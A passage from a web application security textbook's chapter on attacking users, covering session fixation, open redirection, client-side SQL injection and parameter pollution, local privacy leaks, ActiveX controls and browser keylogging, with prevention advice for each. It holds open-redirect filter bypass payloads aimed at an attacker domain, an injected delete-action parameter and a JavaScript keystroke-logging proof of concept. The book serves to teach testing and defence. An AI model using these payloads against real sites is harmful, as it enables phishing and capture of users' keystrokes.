 2. If the same token originally obtained can now be used to retrieve the sensitive data, the application is vulnerable to session fixation.
 3. If any type of session fixation is identified, verify whether the server 
accepts arbitrary tokens it has not previously issued. If it does, the vulnerability is considerably easier to exploit over an extended period.
Preventing Session Fixation Vulnerabilities
At any point when a user interacting with the application transitions from being 
anonymous to being identifi ed, the application should issue a fresh session token. 
This applies both to a successful login and to cases in which an anonymous 
user fi rst submits personal or other sensitive information.
As a defense-in-depth measure to further protect against session fi xation 
attacks, many security-critical applications employ per-page tokens to supplement the main session token. This technique can frustrate most kinds of session 
hijacking attacks. See Chapter 7 for further details.
The application should not accept arbitrary session tokens that it does not 
recognize as having issued itself. The token should be immediately canceled 
within the browser, and the user should be returned to the application‚Äôs start page.
Open Redirection Vulnerabilities
Open redirection vulnerabilities arise when an application takes user-controllable 
input and uses it to perform a redirection, instructing the user‚Äôs browser to 
c13.indd 540 c13.indd 540 8/19/2011 12:14:01 PM 8/19/2011 12:14:01 PM
Stuttard c13.indd V4 - 08/17/2011 Page 541
 Chapter 13 n Attacking Users: Other Techniques 541
visit a different URL than the one requested. These vulnerabilities usually are 
of much less interest to an attacker than cross-site scripting, which can be used 
to perform a much wider range of malicious actions. Open redirection bugs 
are primarily of use in phishing attacks in which an attacker seeks to induce a 
victim to visit a spoofed website and enter sensitive details. A redirection vulnerability can lend credibility to the attacker‚Äôs overtures to potential victims, 
because it enables him to construct a URL that points to the authentic website 
he is targeting. Therefore, this URL is more convincing, and anyone who visits 
it is redirected silently to a website that the attacker controls.
That said, the majority of real-world phishing-style attacks use other techniques 
to gain credibility that are outside the control of the application being targeted. 
Examples include registering similar domain names, using offi cial-sounding subdomains, and creating a simple mismatch between the anchor text and the target 
URLs of links in HTML e-mails. Research has indicated that most users cannot 
or are not inclined to make security decisions based on URL structure. For these 
reasons, the value to phishermen of a typical open redirection bug is fairly marginal.
In recent years, open redirection vulnerabilities have been used in a relatively 
benign way to perform ‚Äúrickrolling‚Äù attacks, in which victims are unwittingly 
redirected to a video of British pop legend Rick Astley, as illustrated in Figure 13-5.
Figure 13-5: The result of a rickrolling attack
c13.indd 541 c13.indd 541 8/19/2011 12:14:01 PM 8/19/2011 12:14:01 PM
Stuttard c13.indd V4 - 08/17/2011 Page 542
542 Chapter 13 n Attacking Users: Other Techniques
Finding and Exploiting Open Redirection Vulnerabilities
The fi rst step in locating open redirection vulnerabilities is to identify every 
instance within the application where a redirect occurs. An application can 
cause the user‚Äôs browser to redirect to a different URL in several ways:
n An HTTP redirect uses a message with a 3xx status code and a Location
header specifying the target of the redirect:
HTTP/1.1 302 Object moved
Location: http://mdsec.net/updates/update29.html
n The HTTP Refresh header can be used to reload a page with an arbitrary 
URL after a fi xed interval, which may be 0 to trigger an immediate redirect:
HTTP/1.1 200 OK
Refresh: 0; url=http://mdsec.net/updates/update29.html
n The HTML <meta> tag can be used to replicate the behavior of any HTTP 
header and therefore can be used for redirection:
HTTP/1.1 200 OK
Content-Length: 125
<html>
<head>
<meta http-equiv=‚Äùrefresh‚Äù content=
‚Äú0;url=http://mdsec.net/updates/update29.html‚Äù>
</head>
</html>
n Various APIs exist within JavaScript that can be used to redirect the browser 
to an arbitrary URL:
HTTP/1.1 200 OK
Content-Length: 120
<html>
<head>
<script>
document.location=‚Äùhttp://mdsec.net/updates/update29.html‚Äù;
</script>
</head>
</html>
In each of these cases, an absolute or relative URL may be specifi ed.
c13.indd 542 c13.indd 542 8/19/2011 12:14:01 PM 8/19/2011 12:14:01 PM
Stuttard c13.indd V4 - 08/17/2011 Page 543
 Chapter 13 n Attacking Users: Other Techniques 543
HACK STEPS
 1. Identify every instance within the application where a redirect occurs.
 2. An effective way to do this is to walk through the application using an 
intercepting proxy and monitor the requests made for actual pages (as 
opposed to other resources, such as images, stylesheets, and script files).
 3. If a single navigation action results in more than one request in succession, investigate what means of performing the redirect is being used.
The majority of redirects are not user-controllable. For example, in a typical 
login mechanism, submitting valid credentials to /login.jsp might return an 
HTTP redirect to /myhome.jsp. The target of the redirect is always the same, so 
it is not subject to any vulnerabilities involving redirection.
However, in other cases, data supplied by the user is used in some way to 
set the target of the redirect. A common instance of this is when an application forces users whose sessions have expired to return to the login page and 
then redirects them to the original URL following successful reauthentication. 
If you encounter this type of behavior, the application may be vulnerable to a 
redirection attack, and you should investigate further to determine whether 
the behavior is exploitable.
HACK STEPS
 1. If the user data being processed in a redirect contains an absolute URL, 
modify the domain name within the URL, and test whether the application 
redirects you to the different domain.
 2. If the user data being processed contains a relative URL, modify this into 
an absolute URL for a different domain, and test whether the application 
redirects you to this domain.
 3. In both cases, if you see behavior like the following, the application is certainly vulnerable to an arbitrary redirection attack:
GET /updates/8/?redir=http://mdattacker.net/ HTTP/1.1
Host: mdsec.net
HTTP/1.1 302 Object moved
Location: http://mdattacker.net/
c13.indd 543 c13.indd 543 8/19/2011 12:14:02 PM 8/19/2011 12:14:02 PM
Stuttard c13.indd V4 - 08/17/2011 Page 544
544 Chapter 13 n Attacking Users: Other Techniques
TRY IT!
http://mdsec.net/updates/8/
http://mdsec.net/updates/14/
http://mdsec.net/updates/18/
http://mdsec.net/updates/23/
http://mdsec.net/updates/48/
NOTE A related phenomenon, which is not quite the same as redirection, 
occurs when an application specifi es the target URL for a frame using usercontrollable data. If you can construct a URL that causes content from an 
external URL to be loaded into a child frame, you can perform a fairly stealthy 
redirection-style attack. You can replace only part of an application‚Äôs existing 
interface with different content and leave the domain of the browser address 
bar unmodifi ed.
It is common to encounter situations in which user-controllable data is being 
used to form the target of a redirect but is being fi ltered or sanitized in some 
way by the application, usually in an attempt to block redirection attacks. In 
this situation, the application may or may not be vulnerable, and your next task 
should be to probe the defenses in place to determine whether they can be circumvented to perform arbitrary redirection. The two general types of defenses 
you may encounter are attempts to block absolute URLs and the addition of a 
specifi c absolute URL prefi x.
Blocking of Absolute URLs
The application may check whether the user-supplied string starts with http://
and, if so, block the request. In this situation, the following tricks may succeed 
in causing a redirect to an external website (note the leading space at the beginning of the third line):
HtTp://mdattacker.net
%00http://mdattacker.net
 http://mdattacker.net
//mdattacker.net
%68%74%74%70%3a%2f%2fmdattacker.net
%2568%2574%2574%2570%253a%252f%252fmdattacker.net
https://mdattacker.net
http:\\mdattacker.net
http:///mdattacker.net
Alternatively, the application may attempt to sanitize absolute URLs by removing http:// and any external domain specifi ed. In this situation, any of the 
c13.indd 544 c13.indd 544 8/19/2011 12:14:02 PM 8/19/2011 12:14:02 PM
Stuttard c13.indd V4 - 08/17/2011 Page 545
 Chapter 13 n Attacking Users: Other Techniques 545
preceding bypasses may be successful, and the following attacks should also 
be tested:
http://http://mdattacker.net
http://mdattacker.net/http://mdattacker.net
hthttp://tp://mdattacker.net
Sometimes, the application may verify that the user-supplied string either 
starts with or contains an absolute URL to its own domain name. In this situation, the following bypasses may be effective:
http://mdsec.net.mdattacker.net
http://mdattacker.net/?http://mdsec.net
http://mdattacker.net/%23http://mdsec.net
TRY IT!
http://mdsec.net/updates/52/
http://mdsec.net/updates/57/
http://mdsec.net/updates/59/
http://mdsec.net/updates/66/
http://mdsec.net/updates/69/
Addition of an Absolute Prefix
The application may form the target of the redirect by appending the usercontrollable string to an absolute URL prefi x:
GET /updates/72/?redir=/updates/update29.html HTTP/1.1
Host: mdsec.net
HTTP/1.1 302 Object moved
Location: http://mdsec.net/updates/update29.html
In this situation, the application may or may not be vulnerable. If the prefi x 
used consists of http:// and the application‚Äôs domain name but does not include 
a slash character after the domain name, it is vulnerable. For example, the URL:
http://mdsec.net/updates/72/?redir=.mdattacker.net
causes a redirect to:
http://mdsec.net.mdattacker.net
This URL is under the attacker‚Äôs control, assuming that he controls the DNS 
records for the domain mdattacker.net.
However, if the absolute URL prefi x includes a trailing slash, or a subdirectory 
on the server, the application probably is not vulnerable to a redirection attack 
c13.indd 545 c13.indd 545 8/19/2011 12:14:02 PM 8/19/2011 12:14:02 PM
Stuttard c13.indd V4 - 08/17/2011 Page 546
546 Chapter 13 n Attacking Users: Other Techniques
aimed at an external domain. The best an attacker can probably achieve is to 
frame a URL that redirects a user to a different URL within the same application. This attack normally does not accomplish anything, because if the attacker 
can induce a user to visit one URL within the application, he can presumably 
just as easily feed the second URL to the user directly.
TRY IT!
http://mdsec.net/updates/72/
In cases where the redirect is initiated using client-side JavaScript that queries 
data from the DOM, all the code responsible for performing the redirect and any 
associated validation typically are visible on the client. You should review this 
closely to determine how user-controllable data is being incorporated into the 
URL, whether any validation is being performed, and, if so, whether any bypasses 
to the validation exist. Bear in mind that, as with DOM-based XSS, some additional validation may be performed on the server before the script is returned 
to the browser. The following JavaScript APIs may be used to perform redirects:
n document.location
n document.URL
n document.open()
n window.location.href
n window.navigate()
n window.open()
TRY IT!
http://mdsec.net/updates/76/
http://mdsec.net/updates/79/
http://mdsec.net/updates/82/
http://mdsec.net/updates/91/
http://mdsec.net/updates/92/
http://mdsec.net/updates/95/
Preventing Open Redirection Vulnerabilities
The most effective way to avoid open redirection vulnerabilities is to not incorporate user-supplied data into the target of a redirect. Developers are inclined 
to use this technique for various reasons, but alternatives usually are available. 
For example, it is common to see a user interface that contains a list of links, 
c13.indd 546 c13.indd 546 8/19/2011 12:14:02 PM 8/19/2011 12:14:02 PM
Stuttard c13.indd V4 - 08/17/2011 Page 547
 Chapter 13 n Attacking Users: Other Techniques 547
each pointing to a redirection page and passing a target URL as a parameter. 
Here, possible alternative approaches include the following:
n Remove the redirection page from the application, and replace links to it 
with direct links to the relevant target URLs.
n Maintain a list of all valid URLs for redirection. Instead of passing the 
target URL as a parameter to the redirect page, pass an index into this 
list. The redirect page should look up the index in its list and return a 
redirect to the relevant URL.
If it is considered unavoidable for the redirection page to receive user-controllable input and incorporate this into the redirect target, one of the following 
measures should be used to minimize the risk of redirection attacks:
n The application should use relative URLs in all its redirects, and the redirect page should strictly validate that the URL received is a relative URL. 
It should verify that the user-supplied URL either begins with a single 
slash followed by a letter or begins with a letter and does not contain a 
colon character before the fi rst slash. Any other input should be rejected, 
not sanitized.
n The application should use URLs relative to the web root for all its redirects, and the redirect page should prepend http://yourdomainname.com
to all user-supplied URLs before issuing the redirect. If the user-supplied 
URL does not begin with a slash character, it should instead be prepended 
with http://yourdomainname.com/.
n The application should use absolute URLs for all redirects, and the redirect page should verify that the user-supplied URL begins with http://
yourdomainname.com/ before issuing the redirect. Any other input should 
be rejected.
As with DOM-based XSS vulnerabilities, it is recommended that applications 
not perform redirects via client-side scripts on the basis of DOM data, because 
this data is outside of the server‚Äôs direct control.
Client-Side SQL Injection
HTML5 supports client-side SQL databases, which applications can use to store 
data on the client. These are accessed using JavaScript, as in the following example:
var db = openDatabase(‚Äòcontactsdb‚Äô, ‚Äò1.0‚Äô, ‚ÄòWahhMail contacts‚Äô, 1000000);
db.transaction(function (tx) {
 tx.executeSql(‚ÄòCREATE TABLE IF NOT EXISTS contacts (id unique, name, 
email)‚Äô);
 tx.executeSql(‚ÄòINSERT INTO contacts (id, name, email) VALUES (1, ‚ÄúMatthew
 Adamson‚Äù, ‚Äúmadam@nucnt.com‚Äù)‚Äô);
});
c13.indd 547 c13.indd 547 8/19/2011 12:14:02 PM 8/19/2011 12:14:02 PM
Stuttard c13.indd V4 - 08/17/2011 Page 548
548 Chapter 13 n Attacking Users: Other Techniques
This functionality allows applications to store commonly used data on the 
client side and retrieve this quickly into the user interface when required. It also 
allows applications to work in ‚Äúoffl ine mode,‚Äù in which all data processed by 
the application resides on the client, and user actions are stored on the client for 
later synchronization with the server, when a network connection is available.
Chapter 9 described how SQL injection attacks into server-side SQL databases 
can arise, where attacker-controlled data is inserted into a SQL query in an 
unsafe way. Exactly the same attack can arise on the client side. Here are some 
scenarios in which this may be possible:
n Social networking applications that store details of the user‚Äôs contacts in 
the local database, including contact names and status updates
n News applications that store articles and user comments in the local 
database for offl ine viewing
n Web mail applications that store e-mail messages in the local database 
and, when running in offl ine mode, store outgoing messages for later 
sending
In these situations, an attacker may be able to perform client-side SQL injection attacks by including crafted input in a piece of data he controls, which the 
application stores locally. For example, sending an e-mail containing a SQL 
injection attack in the subject line might compromise the local database of the 
recipient user, if this data is embedded within a client-side SQL query. Depending 
on exactly how the application uses the local database, serious attacks may be 
possible. Using only SQL injection, an attacker may be able to retrieve from the 
database the contents of other messages the user has received, copy this data 
into a new outgoing e-mail to the attacker, and add this e-mail to the table of 
queued outgoing messages.
The types of data that are often stored in client-side databases are likely to 
include SQL metacharacters such as the single quotation mark. Therefore, many 
SQL injection vulnerabilities are likely to be identifi ed during normal usability testing, so defenses against SQL injection attacks may be in place. As with 
server-side injection, these defenses may contain various bypasses that can be 
used to still deliver a successful attack.
Client-Side HTTP Parameter Pollution
Chapter 9 described how HTTP parameter pollution attacks can be used in some 
situations to interfere with server-side application logic. In some situations, these 
attacks may also be possible on the client side.
Suppose that a web mail application loads the inbox using the following URL:
https://wahh-mail.com/show?folder=inbox&order=down&size=20&start=1
c13.indd 548 c13.indd 548 8/19/2011 12:14:02 PM 8/19/2011 12:14:02 PM
Stuttard c13.indd V4 - 08/17/2011 Page 549
 Chapter 13 n Attacking Users: Other Techniques 549
Within the inbox, several links are displayed next to each message to perform 
actions such as delete, forward, and reply. For example, the link to reply to message number 12 is as follows:
<a href=‚Äùdoaction?folder=inbox&order=down&size=20&start=1&message=12&action=
reply&rnd=1935612936174‚Äù>reply</a>
Several parameters within these links are being copied from parameters in 
the inbox URL. Even if the application defends robustly against XSS attacks, it 
may still be possible for an attacker to construct a URL that displays the inbox 
with different values echoed within these links. For example, the attacker can 
supply a parameter like this:
start=1%26action=delete
This contains a URL-encoded & character that the application server will 
automatically decode. The value of the start parameter that is passed to the 
application is as follows:
1&action=delete
If the application accepts this invalid value and still displays the inbox, and 
if it echoes the value without modifi cation, the link to reply to message number 
12 becomes this:
<a href=‚Äùdoaction?folder=inbox&order=down&size=20&start=1&action=delete&
message=12&action=reply&rnd=1935612936174‚Äù>reply</a>
This link now contains two action parameters‚Äîone specifying delete, and 
one specifying reply. As with standard HTTP parameter pollution, the application‚Äôs behavior when the user clicks the ‚Äúreply‚Äù link depends on how it handles 
the duplicated parameter. In many cases, the fi rst value is used, so the user is 
unwittingly induced to delete any messages he tries to reply to.
In this example, note that the links to perform actions contain an rnd parameter, which is in fact an anti-CSRF token, preventing an attacker from easily 
inducing these actions via a standard CSRF attack. Since the client-side HPP 
attack injects into existing links constructed by the application, the anti-CSRF 
tokens are handled in the normal way and do not prevent the attack.
In most real-world web mail applications, it is likely that many more actions 
exist that can be exploited, including deleting all messages, forwarding individual messages, and creating general mail forwarding rules. Depending on 
how these actions are implemented, it may be possible to inject several required 
parameters into links, and even exploit on-site redirection functions, to induce 
the user to perform complex actions that normally are protected by anti-CSRF 
defenses. Furthermore, it may be possible to use multiple levels of URL encoding to inject several attacks into a single URL. That way, for example, one action 
c13.indd 549 c13.indd 549 8/19/2011 12:14:03 PM 8/19/2011 12:14:03 PM
Stuttard c13.indd V4 - 08/17/2011 Page 550
550 Chapter 13 n Attacking Users: Other Techniques
is performed when the user attempts to read a message, and a further action is 
performed when the user attempts to return to the inbox.
Local Privacy Attacks
Many users access web applications from a shared environment in which an 
attacker may have direct access to the same computer as the user. This gives 
rise to a range of attacks to which insecure applications may leave their users 
vulnerable. This kind of attack may arise in several areas.
NOTE Numerous mechanisms exist by which applications may store 
potentially sensitive data on users‚Äô computers. In many cases, to test 
whether this is being done, it is preferable to start with a completely clean 
browser so that data stored by the application being tested is not lost in 
the noise of existing stored data. An ideal way to do this is using a virtual 
machine with a clean installation of both the operating system and any 
browsers.
Furthermore, on some operating systems, the folders and fi les containing 
locally stored data may be hidden by default when using the built-in fi le system explorer. To ensure that all relevant data is identifi ed, you should confi gure your computer to show all hidden and operating system fi les.
Persistent Cookies
Some applications store sensitive data in a persistent cookie, which most browsers save on the local fi le system.
HACK STEPS
 1. Review all the cookies identified during your application mapping exercises (see Chapter 4). If any Set-cookie instruction contains an expires
attribute with a date that is in the future, this will cause the browser to 
persist that cookie until that date. For example:
UID=d475dfc6eccca72d0e expires=Fri, 10-Aug-18 16:08:29 GMT; 
 2. If a persistent cookie is set that contains any sensitive data, a local 
attacker may be able to capture this data. Even if a persistent cookie contains an encrypted value, if this plays a critical role such as reauthenticating the user without entering credentials, an attacker who captures it can 
resubmit it to the application without actually deciphering its contents 
(see Chapter 6).
c13.indd 550 c13.indd 550 8/19/2011 12:14:03 PM 8/19/2011 12:14:03 PM
Stuttard c13.indd V4 - 08/17/2011 Page 551
 Chapter 13 n Attacking Users: Other Techniques 551
TRY IT!
http://mdsec.net/auth/227/
Cached Web Content
Most browsers cache non-SSL web content unless a website specifi cally instructs 
them not to. The cached data normally is stored on the local fi le system.
HACK STEPS
 1. For any application pages that are accessed over HTTP and that contain 
sensitive data, review the details of the server‚Äôs response to identify any 
cache directives.
 2. The following directives prevent browsers from caching a page. Note that 
these may be specified within the HTTP response headers or within HTML 
metatags:
Expires: 0
Cache-control: no-cache
Pragma: no-cache
 3. If these directives are not found, the page concerned may be vulnerable to 
caching by one or more browsers. Note that cache directives are processed on 
a per-page basis, so every sensitive HTTP-based page needs to be checked.
 4. To verify that sensitive information is being cached, use a default installation of a standard browser, such as Internet Explorer or Firefox. In the 
browser‚Äôs configuration, completely clean its cache and all cookies, and 
then access the application pages that contain sensitive data. Review the 
files that appear in the cache to see if any contain sensitive data. If a large 
number of files are being generated, you can take a specific string from a 
page‚Äôs source and search the cache for that string.
Here are the default cache locations for common browsers:
n Internet Explorer‚ÄîSubdirectories of C:\Documents and Settings\
username\Local Settings\Temporary Internet Files\
Content.IE5
Note that in Windows Explorer, to view this folder you need to enter this 
exact path and have hidden folders showing, or browse to the folder just 
listed from the command line.
n Firefox (on Windows)‚ÄîC:\Documents and Settings\username\
Local Settings\Application Data\Mozilla\Firefox\
Profiles\profile name\Cache
n Firefox (on Linux)‚Äî~/.mozilla/firefox/profile name/Cache
c13.indd 551 c13.indd 551 8/19/2011 12:14:03 PM 8/19/2011 12:14:03 PM
Stuttard c13.indd V4 - 08/17/2011 Page 552
552 Chapter 13 n Attacking Users: Other Techniques
TRY IT!
http://mdsec.net/auth/249/
Browsing History
Most browsers save a browsing history, which may include any sensitive data 
transmitted in URL parameters.
HACK STEPS
 1. Identify any instances within the application in which sensitive data is 
being transmitted via a URL parameter.
 2. If any cases exist, examine the browser history to verify that this data has 
been stored there.
TRY IT!
http://mdsec.net/auth/90/
Autocomplete
Many browsers implement a user-confi gurable autocomplete function for textbased input fi elds, which may store sensitive data such as credit card numbers, 
usernames, and passwords. Internet Explorer stores autocomplete data in the 
registry, and Firefox stores it on the fi le system.
As already described, in addition to being accessible by local attackers, data in 
the autocomplete cache can be retrieved via an XSS attack in certain circumstances.
HACK STEPS
 1. Review the HTML source code for any forms that contain text fields in 
which sensitive data is captured.
 2. If the attribute autocomplete=off is not set, within either the form 
tag or the tag for the individual input field, data entered is stored within 
browsers where autocomplete is enabled.
TRY IT!
http://mdsec.net/auth/260/
c13.indd 552 c13.indd 552 8/19/2011 12:14:03 PM 8/19/2011 12:14:03 PM
Stuttard c13.indd V4 - 08/17/2011 Page 553
 Chapter 13 n Attacking Users: Other Techniques 553
Flash Local Shared Objects
The Flash browser extension implements its own local storage mechanism called 
Local Shared Objects (LSOs), also called Flash cookies. In contrast to most other 
mechanisms, data persisted in LSOs is shared between different browser types, 
provided that they have the Flash extension installed.
HACK STEPS
 1. Several plug-ins are available for Firefox, such as BetterPrivacy, which can 
be used to browse the LSO data created by individual applications.
 2. You can review the contents of the raw LSO data directly on disk. The 
location of this data depends on the browser and operating system. For 
example, on recent versions of Internet Explorer, the LSO data resides 
within the following folder structure:
C:\Users\{username}\AppData\Roaming\Macromedia\Flash Player\
#SharedObjects\{random}\{domain name}\{store name}\{name of 
SWF file}
TRY IT!
http://mdsec.net/auth/245/
Silverlight Isolated Storage
The Silverlight browser extension implements its own local storage mechanism 
called Silverlight Isolated Storage.
HACK STEPS
You can review the contents of the raw Silverlight Isolated Storage data 
directly on disk. For recent versions of Internet Explorer, this data resides 
within a series of deeply nested, randomly named folders at the following 
location:
C:\Users\{username}\AppData\LocalLow\Microsoft\Silverlight\
TRY IT!
http://mdsec.net/auth/239/
c13.indd 553 c13.indd 553 8/19/2011 12:14:03 PM 8/19/2011 12:14:03 PM
Stuttard c13.indd V4 - 08/17/2011 Page 554
554 Chapter 13 n Attacking Users: Other Techniques
Internet Explorer userData
Internet Explorer implements its own custom local storage mechanism called 
userData.
HACK STEPS
You can review the contents of the raw data stored in IE‚Äôs userData directly on 
disk. For recent versions of Internet Explorer, this data resides within the following folder structure:
C:\Users\user\AppData\Roaming\Microsoft\Internet Explorer\
UserData\Low\{random}
TRY IT!
http://mdsec.net/auth/232/
HTML5 Local Storage Mechanisms
HTML5 is introducing a range of new local storage mechanisms, including:
n Session storage
n Local storage
n Database storage
The specifi cations and usage of these mechanisms are still evolving. They are 
not fully implemented in all browsers, and details of how to test for their usage 
and review any persisted data are likely to be browser-dependent.
Preventing Local Privacy Attacks
Applications should avoid storing anything sensitive in a persistent cookie. 
Even if this data is encrypted, it can potentially be resubmitted by an attacker 
who captures it.
Applications should use suitable cache directives to prevent sensitive data 
from being stored by browsers. In ASP applications, the following instructions 
cause the server to include the required directives:
<% Response.CacheControl = ‚Äúno-cache‚Äù %>
<% Response.AddHeader ‚ÄúPragma‚Äù, ‚Äúno-cache‚Äù %>
<% Response.Expires = 0 %>
In Java applications, the following commands should achieve the same result:
c13.indd 554 c13.indd 554 8/19/2011 12:14:03 PM 8/19/2011 12:14:03 PM
Stuttard c13.indd V4 - 08/17/2011 Page 555
 Chapter 13 n Attacking Users: Other Techniques 555
<%
response.setHeader(‚ÄúCache-Control‚Äù,‚Äùno-cache‚Äù);
response.setHeader(‚ÄúPragma‚Äù,‚Äùno-cache‚Äù);
response.setDateHeader (‚ÄúExpires‚Äù, 0);
%>
Applications should never use URLs to transmit sensitive data, because these 
are liable to be logged in numerous locations. All such data should be transmitted using HTML forms that are submitted using the POST method.
In any instance where users enter sensitive data into text input fi elds, the 
autocomplete=off attribute should be specifi ed within the form or fi eld tag.
Other client-side storage mechanisms, such as the new features being introduced with HTML5, provide an opportunity for applications to implement 
valuable application functionality, including much faster access to user-specifi c 
data and the ability to keep working when network access is not available. In 
cases where sensitive data needs to be stored locally, this should ideally be 
encrypted to prevent easy direct access by an attacker. Furthermore, users 
should be advised of the nature of the data that is being stored locally, warned 
of the risks of local access by an attacker, and allowed to opt out of this feature 
if they want to.
Attacking ActiveX Controls
Chapter 5 described how applications can use various thick-client technologies 
to distribute some of the application‚Äôs processing to the client side. ActiveX controls are of particular interest to an attacker who targets other users. When an 
application installs a control to invoke it from its own pages, the control must be 
registered as ‚Äúsafe for scripting.‚Äù After this occurs, any other website accessed 
by the user can use that control.
Browsers do not accept just any ActiveX control that a website asks them to 
install. By default, when a website seeks to install a control, the browser presents a security warning and asks the user for permission. The user can decide 
whether she trusts the website issuing the control and allow it to be installed 
accordingly. However, if she does so, and the control contains any vulnerabilities, 
these can be exploited by any malicious website the user visits.
Two main categories of vulnerability commonly found within ActiveX controls 
are of interest to an attacker:
n Because ActiveX controls typically are written in native languages such 
as C/C++, they are at risk from classic software vulnerabilities such as 
buffer overfl ows, integer bugs, and format string fl aws (see Chapter 16 
for more details). In recent years, a huge number of these vulnerabilities 
c13.indd 555 c13.indd 555 8/19/2011 12:14:04 PM 8/19/2011 12:14:04 PM
Stuttard c13.indd V4 - 08/17/2011 Page 556
556 Chapter 13 n Attacking Users: Other Techniques
have been identifi ed within the ActiveX controls issued by popular web 
applications, such as online gaming sites. These vulnerabilities normally 
can be exploited to cause arbitrary code execution on the computer of 
the victim user.
n Many ActiveX controls contain methods that are inherently dangerous 
and vulnerable to misuse:
n LaunchExe(BSTR ExeName)
n SaveFile(BSTR FileName, BSTR Url)
n LoadLibrary(BSTR LibraryPath)
n ExecuteCommand(BSTR Command)
Methods like these usually are implemented by developers to build some 
fl exibility into their control, enabling them to extend its functionality in the 
future without needing to deploy a fresh control. However, after the control 
is installed, it can, of course, be ‚Äúextended‚Äù in the same way by any malicious 
website to carry out undesirable actions against the user.
Finding ActiveX Vulnerabilities
When an application installs an ActiveX control, in addition to the browser 
alert that asks your permission to install it, you should see code similar to the 
following within the HTML source of an application page:
<object id=‚ÄùoMyObject‚Äù
 classid=‚ÄùCLSID:A61BC839-5188-4AE9-76AF-109016FD8901‚Äù
 codebase=‚Äùhttps://wahh-app.com/bin/myobject.cab‚Äù>
</object>
This code tells the browser to instantiate an ActiveX control with the specifi ed name and classid and to download the control from the specifi ed URL. If 
a control is already installed, the codebase parameter is not required, and the 
browser locates the control from the local computer, based on its unique classid.
If a user gives permission to install the control, the browser registers it as ‚Äúsafe 
for scripting.‚Äù This means that it can be instantiated, and its methods invoked, 
by any website in the future. To verify for sure that this has been done, you can 
check the registry key HKEY_CLASSES_ROOT\CLSID\classid of control taken 
from above HTML\Implemented Categories. If the subkey 7DD95801-9882-
11CF-9FA9-00AA006C42C4 is present, the control has been registered as ‚Äúsafe for 
scripting,‚Äù as shown in Figure 13-6.
c13.indd 556 c13.indd 556 8/19/2011 12:14:04 PM 8/19/2011 12:14:04 PM
Stuttard c13.indd V4 - 08/17/2011 Page 557
 Chapter 13 n Attacking Users: Other Techniques 557
Figure 13-6: A control registered as safe for scripting
When the browser has instantiated an ActiveX control, individual methods 
can be invoked as follows:
<script>
 document.oMyObject.LaunchExe(‚ÄòmyAppDemo.exe‚Äô);
</script>
HACK STEPS
A simple way to probe for ActiveX vulnerabilities is to modify the HTML that 
invokes the control, pass your own parameters to it, and monitor the results:
 1. Vulnerabilities such as buffer overflows can be probed for using the same 
kind of attack payloads described in Chapter 16. Triggering bugs of this 
kind in an uncontrolled manner is likely to result in a crash of the browser 
process that is hosting the control.
 2. Inherently dangerous methods such as LaunchExe can often be identified simply by their name. In other cases, the name may be innocuous or 
obfuscated, but it may be clear that interesting items such as filenames, 
URLs, or system commands are being passed as parameters. You should 
try modifying these parameters to arbitrary values and determine whether 
the control processes your input as expected.
It is common to fi nd that not all the methods implemented by a control are 
actually invoked anywhere within the application. For example, methods may 
have been implemented for testing purposes, may have been superseded but 
not removed, or may exist for future use or self-updating purposes. To perform 
a comprehensive test of a control, it is necessary to enumerate all the attack 
surface it exposes through these methods, and test all of them.
c13.indd 557 c13.indd 557 8/19/2011 12:14:04 PM 8/19/2011 12:14:04 PM
Stuttard c13.indd V4 - 08/17/2011 Page 558
558 Chapter 13 n Attacking Users: Other Techniques
Various tools exist for enumerating and testing the methods exposed by 
ActiveX controls. One useful tool is COMRaider by iDefense, which can display 
all of a control‚Äôs methods and perform basic fuzz testing of each, as shown in 
Figure 13-7.
Figure 13-7: COMRaider showing the methods of an ActiveX control
Preventing ActiveX Vulnerabilities
Defending native compiled software components against attack is a large and 
complex topic that is outside the scope of this book. Basically, the designers and 
developers of an ActiveX control must ensure that the methods it implements 
cannot be invoked by a malicious website to carry out undesirable actions against 
a user who has installed it. For example:
n A security-focused source code review and penetration test should be carried out on the control to locate vulnerabilities such as buffer overfl ows.
n The control should not expose any inherently dangerous methods that 
call out to the fi lesystem or operating system using user-controllable 
c13.indd 558 c13.indd 558 8/19/2011 12:14:04 PM 8/19/2011 12:14:04 PM
Stuttard c13.indd V4 - 08/17/2011 Page 559
 Chapter 13 n Attacking Users: Other Techniques 559
input. Safer alternatives are usually available with minimal extra effort. 
For example, if it is considered necessary to launch external processes, 
compile a list of all the external processes that may legitimately and safely 
be launched. Then either create a separate method to call each one or use 
a single method that takes an index number into this list.
As an additional defense-in-depth precaution, some ActiveX controls 
validate the domain name that issued the HTML page from which they 
are being invoked. Microsoft‚Äôs SiteLock Active Template Library template 
allows developers to restrict the use of an ActiveX control to a specifi c list 
of domain names.
Some controls go even further by requiring that all parameters passed to the 
control must be cryptographically signed. If the signature passed is invalid, the 
control does not carry out the requested action. You should be aware that some 
defenses of this kind can be circumvented if the website that is permitted to 
invoke the control contains any XSS vulnerabilities.
Attacking the Browser
The attacks described so far in this and the preceding chapter involve exploiting 
some feature of an application‚Äôs behavior to compromise users of the application. 
Attacks such as cross-site scripting, cross-site request forgery, and JavaScript 
hijacking all arise from vulnerabilities within specifi c web applications, even 
though the details of some exploit techniques may leverage quirks within specifi c browsers.
A further category of attacks against users does not depend on the behavior of specifi c applications. Rather, these attacks rely solely on features of 
the browser‚Äôs behavior, or on the design of core web technologies themselves. These attacks can be delivered by any malicious website or by any 
benign site that has itself been compromised. As such, they lie at the edge 
of the scope of a book about hacking web applications. Nevertheless, they 
are worthy of brief consideration partly because they share some features 
with attacks that exploit application-specifi c functions. They also provide 
context for understanding the impact of various application behaviors by 
showing what is possible for an attacker to achieve even in the absence of 
any application-specifi c fl aws.
The discussion in the following sections is necessarily concise. There is certainly room for an entire book to be written on this subject. Would-be authors 
with a signifi cant amount of spare time are encouraged to submit a proposal 
to Wiley for The Browser Hacker‚Äôs Handbook.
c13.indd 559 c13.indd 559 8/19/2011 12:14:04 PM 8/19/2011 12:14:04 PM
Stuttard c13.indd V4 - 08/17/2011 Page 560
560 Chapter 13 n Attacking Users: Other Techniques
Logging Keystrokes
JavaScript can be used to monitor all keys the user presses while the browser 
window has the focus, including passwords, private messages, and other personal information. The following proof-of-concept script captures all keystrokes 
in Internet Explorer and displays them in the browser‚Äôs status bar:
<script>document.onkeypress = function () {
 window.status += String.fromCharCode(window.event.keyCode);
} </script>
These attacks can capture keystrokes only while the frame in which the code is 
running has the focus. However, some applications leave themselves vulnerable 
to keylogging when they embed a third-party widget or advertising applet in a 
frame within the application‚Äôs own pages. In so-called ‚Äúreverse strokejacking‚Äù 
